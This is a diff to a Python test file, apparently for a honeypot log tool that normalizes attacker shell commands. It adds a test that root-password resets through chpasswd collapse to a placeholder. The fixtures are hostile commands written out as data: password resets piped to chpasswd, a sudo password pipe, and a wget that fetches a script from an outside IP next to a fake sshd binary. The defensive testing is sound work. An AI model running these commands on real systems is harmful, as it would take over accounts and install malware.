@@ -23,6 +23,13 @@ def test_replayed_login_password_collapses():
     assert normalize_command(a).startswith("echo '<PASS>' | sudo -S")
 
 
+def test_random_new_password_collapses_but_target_user_stays():
+    a = 'echo "root:81V1Mga130kv"|chpasswd|bash'
+    b = 'echo "root:9edFpSPY4D9s"|chpasswd|bash'
+    assert normalize_command(a) == normalize_command(b) == 'echo "root:<PASS>"|chpasswd|bash'
+    assert normalize_command('echo "admin:x1"|chpasswd') != normalize_command('echo "root:x1"|chpasswd')
+
+
 def test_temp_paths_and_ips_collapse():
     assert normalize_command("chmod +x /tmp/x8Fq2/sshd; wget http://45.9.148.1/a.sh") == normalize_command(
         "chmod +x /tmp/Zz91k/sshd; wget http://103.4.5.66/a.sh"
